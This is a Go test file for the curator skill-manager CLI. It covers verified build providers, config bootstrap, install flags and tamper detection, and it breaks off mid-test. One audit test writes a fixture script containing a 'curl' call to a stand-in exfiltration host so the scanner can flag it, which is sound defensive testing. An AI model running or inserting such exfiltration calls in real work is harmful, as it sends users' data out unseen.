package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/relux-works/curator/internal/buildcache"
	"github.com/relux-works/curator/internal/buildmeta"
	"github.com/relux-works/curator/internal/buildrepo"
	"github.com/relux-works/curator/internal/closureexec"
	"github.com/relux-works/curator/internal/closuregraph"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/gitcred"
	"github.com/relux-works/curator/internal/godriver"
	"github.com/relux-works/curator/internal/hashing"
	"github.com/relux-works/curator/internal/install"
	"github.com/relux-works/curator/internal/manifest"
	"github.com/relux-works/curator/internal/marker"
	"github.com/relux-works/curator/internal/rustsource"
	"github.com/relux-works/curator/internal/testtoolchain"
)

func writeAssuranceCLIConfig(t *testing.T, mode string) string {
	t.Helper()
	root := t.TempDir()
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(`{"schema_version":1,"agents":["codex_cli"],"skills":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	execution := map[string]any{"mode": mode}
	if mode == "verified" {
		execution["provider_id"] = "host.provider"
		execution["provider_version"] = "1.0.0"
		execution["provider_binary_sha256"] = "sha256:" + strings.Repeat("a", 64)
		execution["provider_trust_evidence"] = "system-signature-policy-v1"
	}
	document := map[string]any{
		"schema_version": float64(1), "skills_root": filepath.Join(root, "skills"),
		"projects": map[string]any{"app": map[string]any{"path": project, "agents": []string{"codex_cli"}}},
	}
	if mode != "" {
		document["execution"] = execution
	}
	payload, err := json.Marshal(document)
	if err != nil {
		t.Fatal(err)
	}
	configPath := filepath.Join(root, "config.json")
	if err = os.WriteFile(configPath, payload, 0o600); err != nil {
		t.Fatal(err)
	}
	return configPath
}

type cliVerifiedProvider struct {
	identity           closureexec.ProviderIdentity
	receiptID          closuregraph.ID
	dispatches         int
	mutateCapabilities func(*closureexec.ProviderCapabilityReceipt)
	receipt            *closureexec.ProviderCapabilityReceipt
}

func newCLIVerifiedProvider() *cliVerifiedProvider {
	return &cliVerifiedProvider{identity: closureexec.ProviderIdentity{
		Contract: closureexec.VerifiedProviderContractID, ProviderID: "fixture.provider", Version: "1.0.0",
		BinarySHA256: closuregraph.ID("sha256:" + strings.Repeat("b", 64)), TrustEvidence: "fixture-signature",
	}}
}

func (*cliVerifiedProvider) LosslessObservation() bool { return true }
func (*cliVerifiedProvider) EnforceAndObserve(context.Context, closureexec.ExecutionRequest) (closureexec.Audit, error) {
	return closureexec.Audit{}, nil
}
func (provider *cliVerifiedProvider) Identity() closureexec.ProviderIdentity {
	return provider.identity
}
func (provider *cliVerifiedProvider) Negotiate(_ context.Context, nonce string) (closureexec.ProviderCapabilityReceipt, error) {
	if provider.receipt == nil {
		now := time.Now()
		provider.receipt = &closureexec.ProviderCapabilityReceipt{
			Provider: provider.identity, Health: "healthy", Nonce: nonce,
			ObservedAt: now.Add(-time.Second), ExpiresAt: now.Add(time.Minute),
			Capabilities: []closureexec.CapabilityEvidence{
				{CapabilityID: "total-network-denial-v1", Status: "established"},
				{CapabilityID: "read-only-source-and-toolchain-v1", Status: "established"},
				{CapabilityID: "exact-executable-allowlisting-v1", Status: "established"},
				{CapabilityID: "private-build-root-only-writes-v1", Status: "established"},
				{CapabilityID: "hard-aggregate-descendant-resource-bounds-v1", Status: "established"},
				{CapabilityID: "fail-closed-capability-preflight-v1", Status: "established"},
			},
		}
	}
	receipt := *provider.receipt
	receipt.Capabilities = append([]closureexec.CapabilityEvidence(nil), provider.receipt.Capabilities...)
	if provider.mutateCapabilities != nil {
		provider.mutateCapabilities(&receipt)
	}
	provider.receiptID, _ = receipt.ID()
	return receipt, nil
}
func (provider *cliVerifiedProvider) BuildToolchain() install.Toolchain {
	return cliVerifiedToolchain{provider: provider}
}
func (provider *cliVerifiedProvider) BuildBuilder() install.Builder { return provider }

type cliVerifiedToolchain struct{ provider *cliVerifiedProvider }

func (toolchain cliVerifiedToolchain) Probe(context.Context) (buildmeta.Target, buildmeta.Toolchain, error) {
	return cliVerifiedTarget(), cliVerifiedToolchainIdentity(), nil
}
func (toolchain cliVerifiedToolchain) Establish(context.Context) (install.BuildSession, error) {
	root, err := os.MkdirTemp("", "curator-verified-cli-test-")
	if err != nil {
		return nil, err
	}
	return &cliVerifiedSession{root: root}, nil
}

type cliVerifiedSession struct{ root string }

func (*cliVerifiedSession) Target() buildmeta.Target              { return cliVerifiedTarget() }
func (*cliVerifiedSession) Toolchain() buildmeta.Toolchain        { return cliVerifiedToolchainIdentity() }
func (*cliVerifiedSession) VerifyToolchain(context.Context) error { return nil }
func (session *cliVerifiedSession) Release() error                { return os.RemoveAll(session.root) }

func (provider *cliVerifiedProvider) Stage(_ context.Context, request install.StageRequest) (install.StagedArtifact, error) {
	provider.dispatches++
	session := request.Session.(*cliVerifiedSession)
	relative, err := buildmeta.ArtifactPath(request.Command, session.Target().GOOS)
	if err != nil {
		return install.StagedArtifact{}, err
	}
	path := filepath.Join(session.root, filepath.FromSlash(relative))
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return install.StagedArtifact{}, err
	}
	payload := []byte("verified-provider-artifact")
	if err := os.WriteFile(path, payload, 0o700); err != nil {
		return install.StagedArtifact{}, err
	}
	digest := sha256.Sum256(payload)
	artifact := buildmeta.Artifact{Path: relative, SHA256: "sha256:" + hex.EncodeToString(digest[:]), Size: int64(len(payload))}
	input := buildmeta.Input{
		SchemaVersion: buildmeta.SchemaVersion, Driver: buildmeta.DriverGoV1,
		BuildSource: request.Source.Identity(), BuildRoot: request.BuildRoot, Command: request.Command,
		SourceDir: request.SourceDir, Target: session.Target(), Toolchain: session.Toolchain(), Policy: buildmeta.FixedPolicy(),
	}
	contract := closureexec.VerifiedProviderContractID
	binding := closureexec.AssuranceBinding{
		AssuranceMode: closureexec.AssuranceVerified, PolicyID: closureexec.VerifiedPolicyID,
		ExecutionPolicyID: closureexec.VerifiedExecutionPolicyID, ProviderContract: &contract,
		Provider: &provider.identity, CapabilityReceiptID: &provider.receiptID,
		ActualCapabilities: []closureexec.CapabilityEvidence{
			{CapabilityID: "total-network-denial-v1", Status: "established"},
			{CapabilityID: "read-only-source-and-toolchain-v1", Status: "established"},
			{CapabilityID: "exact-executable-allowlisting-v1", Status: "established"},
			{CapabilityID: "private-build-root-only-writes-v1", Status: "established"},
			{CapabilityID: "hard-aggregate-descendant-resource-bounds-v1", Status: "established"},
			{CapabilityID: "fail-closed-capability-preflight-v1", Status: "established"},
		},
	}
	providerExecution := closuregraph.ID("sha256:" + strings.Repeat("e", 64))
	receipt, err := closureexec.NewVerifiedBuildSessionReceipt(binding, input, artifact, providerExecution)
	return install.StagedArtifact{Path: path, Metadata: artifact, ExecutionReceipt: receipt}, err
}

func cliVerifiedTarget() buildmeta.Target {
	target := buildmeta.Target{GOOS: runtime.GOOS, GOARCH: runtime.GOARCH, Tuning: map[string]string{}}
	keys := map[string]string{"386": "GO386", "amd64": "GOAMD64", "arm": "GOARM", "arm64": "GOARM64", "mips": "GOMIPS", "mipsle": "GOMIPS", "mips64": "GOMIPS64", "mips64le": "GOMIPS64", "ppc64": "GOPPC64", "ppc64le": "GOPPC64", "riscv64": "GORISCV64", "wasm": "GOWASM"}
	if key := keys[runtime.GOARCH]; key != "" {
		target.Tuning[key] = "v1"
	}
	return target
}

func cliVerifiedToolchainIdentity() buildmeta.Toolchain {
	return buildmeta.Toolchain{
		Algorithm: buildmeta.ToolchainAlgorithm, GoRelpath: buildmeta.ToolchainGoRelpath,
		GoVersion:     "go version go1.25.5 " + runtime.GOOS + "/" + runtime.GOARCH,
		ContentSHA256: "sha256:" + strings.Repeat("c", 64),
	}
}

func TestCLICompatibleVerifiedProviderOwnsBuildDispatchAndReceipt(t *testing.T) {
	requireNativeControlInventoryPlatform(t)
	_, home := compiledProject(t)
	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("portable seed install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	portableEntries := publishedCacheEntries(t, home)
	if len(portableEntries) != 1 {
		t.Fatalf("portable seed published %d entries", len(portableEntries))
	}
	configureVerifiedCLI(t)
	provider := newCLIVerifiedProvider()
	prior := resolveCLIProvider
	resolveCLIProvider = func(config.Execution) install.VerifiedBuildSessionProvider { return provider }
	t.Cleanup(func() { resolveCLIProvider = prior })

	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("verified install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	if provider.dispatches != 1 {
		t.Fatalf("verified provider dispatches = %d, want 1", provider.dispatches)
	}
	entries := publishedCacheEntries(t, home)
	if len(entries) != 2 {
		t.Fatalf("portable and verified installs published %d disjoint entries", len(entries))
	}
	verifiedReceipts := 0
	for _, entry := range entries {
		receiptBytes, err := os.ReadFile(filepath.Join(entry, buildcache.ExecutionReceiptFilename))
		if err != nil {
			t.Fatal(err)
		}
		receipt, err := closureexec.DecodeBuildSessionReceipt(receiptBytes)
		if err != nil {
			t.Fatal(err)
		}
		if receipt.Binding.AssuranceMode == closureexec.AssuranceVerified {
			verifiedReceipts++
			if receipt.Binding.CapabilityReceiptID == nil || *receipt.Binding.CapabilityReceiptID != provider.receiptID {
				t.Fatalf("verified receipt = %+v", receipt)
			}
		}
	}
	if verifiedReceipts != 1 {
		t.Fatalf("verified receipt count = %d", verifiedReceipts)
	}
}

func TestCLIVerifiedCapabilityDriftStartsNothingAndAdoptsNoCache(t *testing.T) {
	requireNativeControlInventoryPlatform(t)
	_, home := compiledProject(t)
	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("portable seed install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	before := publishedCacheEntries(t, home)
	if len(before) != 1 {
		t.Fatalf("portable seed published %d entries", len(before))
	}
	configureVerifiedCLI(t)
	provider := newCLIVerifiedProvider()
	provider.mutateCapabilities = func(receipt *closureexec.ProviderCapabilityReceipt) {
		receipt.Capabilities[0].Status = "advisory"
	}
	prior := resolveCLIProvider
	resolveCLIProvider = func(config.Execution) install.VerifiedBuildSessionProvider { return provider }
	t.Cleanup(func() { resolveCLIProvider = prior })

	if code, _, stderr := capture(t, "install", "app"); code != exitFail || !strings.Contains(stderr, "verified_capabilities_unsatisfied") {
		t.Fatalf("capability drift = code %d stderr %q", code, stderr)
	}
	if provider.dispatches != 0 {
		t.Fatalf("capability drift started %d builds", provider.dispatches)
	}
	if entries := publishedCacheEntries(t, home); len(entries) != 1 || entries[0] != before[0] {
		t.Fatalf("capability drift changed/adopted cache entries: before=%v after=%v", before, entries)
	}
}

func configureVerifiedCLI(t *testing.T) {
	t.Helper()
	configPath := os.Getenv("CURATOR_CONFIG")
	payload, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	var document map[string]any
	if err := json.Unmarshal(payload, &document); err != nil {
		t.Fatal(err)
	}
	document["execution"] = map[string]any{
		"mode": "verified", "provider_id": "fixture.provider", "provider_version": "1.0.0",
		"provider_binary_sha256": "sha256:" + strings.Repeat("b", 64), "provider_trust_evidence": "fixture-signature",
	}
	payload, _ = json.Marshal(document)
	if err := os.WriteFile(configPath, payload, 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestCLIExecutionAssuranceSelectionIsPortableDefaultAndVerifiedFailClosed(t *testing.T) {
	t.Run("portable", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, ""))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitOK {
			t.Fatalf("portable install dry-run exit=%d", code)
		}
	})
	t.Run("verified missing provider", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, "verified"))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitFail {
			t.Fatalf("verified install dry-run exit=%d", code)
		}
	})
	t.Run("unknown mode", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, "unknown"))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitFail {
			t.Fatalf("unknown-mode install dry-run exit=%d", code)
		}
	})
}

func TestProductionExternalDepsBindTrustedGitAndAudit(t *testing.T) {
	t.Parallel()
	deps := productionExternalDeps(&config.Config{}, true)
	if err := buildrepo.ValidateGitTool(context.Background(), deps.GitTool); err != nil {
		t.Fatalf("production Git dependency is unusable: %v", err)
	}
	if deps.AuditWarnings == nil {
		t.Fatal("production external audit dependency is nil")
	}
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:     buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective:    buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)},
		SnapshotRoot: t.TempDir(),
	})
	if err != nil || len(warnings) != 0 {
		t.Fatalf("disabled configured audit rejected structurally valid subject: %v", err)
	}
}

func TestProductionExternalAuditReturnsAdvisoryWarnings(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "tool"), []byte("curl https://exfil.example.net/x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json"), Audit: config.Audit{Enabled: true, Mode: "advisory", FailOn: "high", Backend: "null"}}
	deps := productionExternalDeps(cfg, true)
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:  buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective: buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)}, SnapshotRoot: root,
	})
	if err != nil || len(warnings) == 0 {
		t.Fatalf("advisory audit warnings=%v err=%v", warnings, err)
	}
}

func TestUsageEnumeratesDocumentedCommands(t *testing.T) {
	t.Parallel()
	for _, command := range []string{
		"bootstrap", "init", "add", "remove", "install", "update", "upgrade",
		"status", "list", "project", "config", "skill", "global", "hybrid",
		"audit", "gc", "shell-init", "ui",
	} {
		if !strings.Contains(usage, command) {
			t.Fatalf("usage does not enumerate %q", command)
		}
	}
}

func TestRunVersionExitsZero(t *testing.T) {
	t.Parallel()
	if code := run([]string{"--version"}); code != 0 {
		t.Fatalf("run(--version) = %d, want 0", code)
	}
}

func TestRunNoArgsPrintsUsage(t *testing.T) {
	t.Parallel()
	if code := run(nil); code != 2 {
		t.Fatalf("run() = %d, want 2", code)
	}
}

func TestRunUnknownCommand(t *testing.T) {
	t.Parallel()
	if code := run([]string{"frobnicate"}); code != 2 {
		t.Fatalf("run(frobnicate) = %d, want 2", code)
	}
}

func TestShellInitPrintsHooks(t *testing.T) {
	t.Parallel()
	for _, shellName := range []string{"auto", "zsh", "bash", "powershell"} {
		if code := run([]string{"shell-init", shellName}); code != 0 {
			t.Fatalf("shell-init %s = %d", shellName, code)
		}
	}
	if code := run([]string{"shell-init"}); code != 0 {
		t.Fatalf("auto shell-init = %d", code)
	}
	if code := run([]string{"shell-init", "fish"}); code != 2 {
		t.Fatalf("unsupported shell must be usage error")
	}
	if code := run([]string{"shell-init", "fish", "--install"}); code != 2 {
		t.Fatalf("unsupported installed shell must be usage error")
	}
}

func TestShellInitInstallCachesHookWithoutConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "manager home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	t.Setenv("SHELL", "/bin/bash")
	if code := run([]string{"shell-init", "--install", "--no-global"}); code != exitOK {
		t.Fatalf("shell-init --install = %d", code)
	}
	hookPath := filepath.Join(filepath.Dir(configPath), "hooks", "curator.bash")
	payload, err := os.ReadFile(hookPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(payload), "_curator_global_env_file") {
		t.Fatalf("--no-global cached a global hook:\n%s", payload)
	}
}

func TestSkillCheckOnTempDir(t *testing.T) {
	t.Parallel()
	// an empty directory fails validation (missing SKILL.md)
	dir := t.TempDir()
	if code := run([]string{"skill", "check", dir}); code != 1 {
		t.Fatalf("skill check on empty dir = %d, want 1", code)
	}
	if code := run([]string{"skill", "check", dir, "--json"}); code != 1 {
		t.Fatalf("skill check with trailing --json = %d, want 1", code)
	}
}

func TestInstallFlagsAcceptTrailingOptions(t *testing.T) {
	t.Parallel()
	opts, positional, all, auditMode, err := installFlags([]string{"project-a", "--dry-run", "--strict-tags", "--audit", "strict"})
	if err != nil {
		t.Fatal(err)
	}
	if len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("positional = %v", positional)
	}
	if !opts.DryRun || !opts.StrictTags || all || auditMode != "strict" {
		t.Fatalf("parsed flags: opts=%+v all=%v audit=%q", opts, all, auditMode)
	}
}

func TestInstallAuditFlagAcceptsOptionalMode(t *testing.T) {
	t.Parallel()
	_, positional, _, auditMode, err := installFlags([]string{"--audit", "project-a"})
	if err != nil || auditMode != "advisory" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("bare --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
	_, positional, _, auditMode, err = installFlags([]string{"project-a", "--audit", "strict"})
	if err != nil || auditMode != "strict" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("strict --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
}

// The run-wide SSH selection reaches an install from the command line, and the
// environment fills only what the command line left unsaid.
func TestInstallFlagsCarryTheRunWideBuildSSHSelection(t *testing.T) {
	opts, positional, _, _, err := installFlags([]string{
		"project-a", "--build-ssh-agent", "auto", "--build-ssh-identity", "/operator/id.pub",
		"--build-ssh-known-hosts", "/operator/known_hosts",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("positional = %v", positional)
	}
	want := install.BuildSSHFlags{
		Identity: "/operator/id.pub", Agent: install.BuildSSHAgentAuto,
		KnownHosts: "/operator/known_hosts",
	}
	if opts.BuildSSH != want {
		t.Fatalf("build-ssh flags = %+v, want %+v", opts.BuildSSH, want)
	}

	environment := map[string]string{
		install.EnvBuildSSHIdentity: "/operator/env.pub",
		install.EnvBuildSSHAgent:    "/operator/env.sock",
		"SSH_AUTH_SOCK":             "/operator/live.sock",
	}
	selection := install.CaptureBuildSSHSelection(nil, opts.BuildSSH,
		func(name string) string { return environment[name] })
	if selection.RunWide.Identity != "/operator/id.pub" || selection.RunWide.Agent != install.BuildSSHAgentAuto {
		t.Fatalf("selection = %+v, want the flag values to win", selection.RunWide)
	}
	if selection.AgentSocket != "/operator/live.sock" {
		t.Fatalf("live agent socket = %q", selection.AgentSocket)
	}
}

func TestSelectProjectTargetsUsesAliasesAndStableAllOrder(t *testing.T) {
	t.Parallel()
	cfg := &config.Config{Projects: map[string]config.Project{
		"zeta":  {Path: "/work/zeta"},
		"alpha": {Path: "/work/alpha"},
	}}
	targets, err := selectProjectTargets(cfg, []string{"alpha"}, false)
	if err != nil || len(targets) != 1 || targets[0].Root != "/work/alpha" || targets[0].Alias != "alpha" {
		t.Fatalf("alias targets = %+v, %v", targets, err)
	}
	targets, err = selectProjectTargets(cfg, nil, true)
	if err != nil || len(targets) != 2 || targets[0].Alias != "alpha" || targets[1].Alias != "zeta" {
		t.Fatalf("all targets = %+v, %v", targets, err)
	}
}

func TestStatusDriftDetectsContentTampering(t *testing.T) {
	t.Parallel()
	project := t.TempDir()
	skillsRoot := t.TempDir()
	if err := os.WriteFile(filepath.Join(project, "Skillfile.json"), []byte(
		`{"schema_version":1,"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	installed := filepath.Join(project, ".agents", "skills", "skill-a")
	if err := os.MkdirAll(installed, 0o755); err != nil {
		t.Fatal(err)
	}
	skillPath := filepath.Join(installed, "SKILL.md")
	if err := os.WriteFile(skillPath, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}
	hash, err := hashing.ContentSHA256(installed, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := marker.Write(installed, &marker.Marker{
		Name: "skill-a", Source: "skill-a", RefKind: "tag", Ref: "v1",
		Commit: "0123456789abcdef0123456789abcdef01234567", ContentSHA256: hash,
		InstalledAt: "2026-07-13T00:00:00Z",
	}); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(skillPath, []byte("tampered"), 0o644); err != nil {
		t.Fatal(err)
	}
	drift := statusDrift(&config.Config{SkillsRoot: skillsRoot}, project)
	if drift["skill-a"] != "content-drift" {
		t.Fatalf("drift = %v", drift)
	}
}

func TestBootstrapAndProjectCommands(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := t.TempDir()
	if code := run([]string{"bootstrap", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap = %d", code)
	}
	project := t.TempDir()
	if code := run([]string{"project", "add", "app", project, "--agents", "codex_cli"}); code != exitOK {
		t.Fatalf("project add = %d", code)
	}
	if _, err := os.Stat(filepath.Join(project, manifest.Name)); err != nil {
		t.Fatalf("project manifest missing: %v", err)
	}
	if code := run([]string{"project", "resolve", "app"}); code != exitOK {
		t.Fatalf("project resolve = %d", code)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil || cfg.Projects["app"].Path != project {
		t.Fatalf("saved project: cfg=%+v err=%v", cfg, err)
	}
}

func TestBootstrapIfMissingKeepsExistingConfigWithoutParsing(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	original := []byte("this is intentionally not valid JSON\n")
	if err := os.WriteFile(configPath, original, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive"}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	payload, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(payload) != string(original) {
		t.Fatalf("existing config changed:\n%s", payload)
	}
}

func TestBootstrapIfMissingCreatesAbsentConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(t.TempDir(), "skills")

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	loaded, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.SkillsRoot != skillsRoot {
		t.Fatalf("skills_root = %q, want %q", loaded.SkillsRoot, skillsRoot)
	}
}

func TestBootstrapIfMissingRejectsForce(t *testing.T) {
	t.Setenv("CURATOR_CONFIG", filepath.Join(t.TempDir(), "config.json"))
	if code := run([]string{"bootstrap", "--if-missing", "--force"}); code != exitUsage {
		t.Fatalf("bootstrap --if-missing --force = %d, want %d", code, exitUsage)
	}
}

func TestUpgradeDryRunDoesNotCreateOrFetchSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(`{"schema_version":1,"agents":["codex_cli"],"skills":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"upgrade", "app", "--dry-run"}); code != exitOK {
		t.Fatalf("upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("upgrade --dry-run created skills root: %v", err)
	}
}

func TestGlobalUpgradeDryRunDoesNotCreateSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)
	if code := run([]string{"global", "init"}); code != exitOK {
		t.Fatalf("global init = %d", code)
	}
	if code := run([]string{"global", "upgrade", "--dry-run"}); code != exitOK {
		t.Fatalf("global upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("global upgrade --dry-run created skills root: %v", err)
	}
}

func TestCLIEndToEndInstallStatusAndTamperCheck(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(root, "skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(filepath.Join(skillsRoot, "skill-a"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}

	skillRepo := filepath.Join(skillsRoot, "skill-a")
	runGit(t, skillRepo, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(skillRepo, "SKILL.md"), []byte("---\nname: skill-a\n---\n# Skill\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, skillRepo, "add", ".")
	runGit(t, skillRepo, "commit", "-qm", "initial skill")
	runGit(t, skillRepo, "tag", "v1")

	runGit(t, project, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(
		`{"schema_version":1,"agents":["codex_cli"],"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}

	if code := run([]string{"install", "app"}); code != exitOK {
		t.Fatalf("install = %d", code)
	}
	installedSkill := filepath.Join(project, ".agents", "skills", "skill-a", "SKILL.md")
	if _, err := os.Stat(installedSkill); err != nil {
		t.Fatalf("installed skill missing: %v", err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitOK {
		t.Fatalf("clean status = %d", code)
	}
	if err := os.WriteFile(installedSkill, []byte("tampered\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitFail {
		t.Fatalf("tampered status = %d, want %d", code, exitFail)
	}
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	// Test repositories are data fixtures, never signing operations. Ignore
	// workstation signing policy so credentials cannot be requested or folded
	// into source/package inputs during lifecycle tests.
	gitArgs := append([]string{"-c", "commit.gpgsign=false", "-c", "tag.gpgSign=false"}, args...)
	command := exec.Command("git", gitArgs...)
	command.Dir = dir
	command.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=Test", "GIT_AUTHOR_EMAIL=test@example.com",
		"GIT_COMMITTER_NAME=Test", "GIT_COMMITTER_EMAIL=test@example.com",
	)
	if output, err := command.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, output)
	}
}

// TestHiddenWorkerModeIsNotAUserVisibleCommand proves the fixed go-v1 worker
// mode is dispatched before command parsing and never appears in the CLI
// surface, so no package, manifest, or user option can reach it by name.
func TestHiddenWorkerModeIsNotAUserVisibleCommand(t *testing.T) {
	t.Parallel()
	for _, mode := range []string{godriver.WorkerMode, "__curator_rust_git_oracle_v1"} {
		if strings.Contains(usage, mode) {
			t.Fatalf("hidden worker mode %q appears in the user-visible command surface", mode)
		}
		if code := run([]string{mode}); code != exitUsage {
			t.Fatalf("run(%q) = %d, want the unknown-command usage exit", mode, code)
		}
		if code := run([]string{mode, "extra"}); code != exitUsage {
			t.Fatalf("run with %q and an extra argument = %d, want the unknown-command usage exit", mode, code)
		}
	}
}

// productionBinarySuffix names the extension the platform requires before it
// will exec a freshly built binary by absolute path.
func productionBinarySuffix() string {
	if runtime.GOOS == "windows" {
		return ".exe"
	}
	return ""
}

func TestProductionBinaryDispatchesRustOracleBeforeAmbientCargoDiscovery(t *testing.T) {
	t.Parallel()
	testtoolchain.LockHostGOROOT(t)
	binary := filepath.Join(t.TempDir(), "curator"+productionBinarySuffix())
	build := exec.Command("go", "build", "-o", binary, ".")
	if output, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build production curator: %v\n%s", err, output)
	}

	source := t.TempDir()
	if err := os.Mkdir(filepath.Join(source, "src"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(source, "Cargo.toml"), []byte("[package]\nname = \"oracle_fixture\"\nversion = \"0.1.0\"\nedition = \"2021\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(source, "src", "lib.rs"), []byte("pub fn value() -> u8 { 7 }\n"), 0o600); err != nil {
